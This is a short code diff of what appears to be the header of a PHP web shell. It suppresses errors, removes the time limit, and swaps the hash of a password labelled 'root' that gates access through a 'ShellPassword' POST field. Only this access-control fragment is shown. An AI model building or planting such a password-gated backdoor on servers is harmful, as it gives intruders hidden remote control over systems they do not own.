@@ -3,7 +3,7 @@ error_reporting(0);
 set_time_limit(0);
 session_start();
 
-$Password = "f81f0ccab46dbb76f27fc7354cd05deb"; //root
+$Password = "1cf1f8d0c7181f3730fbd782a692ffe2"; //root
 
 if(isset($_POST[ShellPassword])){
 
